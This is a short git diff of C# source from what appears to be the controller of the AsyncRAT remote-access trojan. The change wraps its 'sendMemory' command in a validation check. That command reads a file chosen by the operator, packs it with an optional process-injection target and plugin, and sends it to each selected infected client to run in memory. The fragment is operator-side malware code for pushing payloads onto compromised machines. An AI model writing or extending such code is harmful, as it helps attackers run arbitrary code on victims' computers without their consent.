@@ -217,28 +217,31 @@ namespace AsyncRAT_Sharp
             {
                 SendFileToMemory SF = new SendFileToMemory();
                 SF.ShowDialog();
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "sendMemory";
-                msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
-                if (SF.comboBox1.SelectedIndex == 0)
+                if (SF.toolStripStatusLabel1.Text.Length > 0 && SF.toolStripStatusLabel1.ForeColor == Color.Green)
                 {
-                    msgpack.ForcePathObject("Inject").AsString = "";
-                    msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
-                }
-                else
-                {
-                    msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
-                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
-                }
-
-                foreach (ListViewItem C in listView1.SelectedItems)
-                {
-                    Task.Run(() =>
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "sendMemory";
+                    msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
+                    if (SF.comboBox1.SelectedIndex == 0)
                     {
-                        Clients CL = (Clients)C.Tag;
-                        CL.BeginSend(msgpack.Encode2Bytes());
-                        CL.LV.ForeColor = Color.Red;
-                    });
+                        msgpack.ForcePathObject("Inject").AsString = "";
+                        msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
+                    }
+                    else
+                    {
+                        msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
+                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                    }
+
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Task.Run(() =>
+                        {
+                            Clients CL = (Clients)C.Tag;
+                            CL.BeginSend(msgpack.Encode2Bytes());
+                            CL.LV.ForeColor = Color.Red;
+                        });
+                    }
                 }
                 SF.Close();
             }
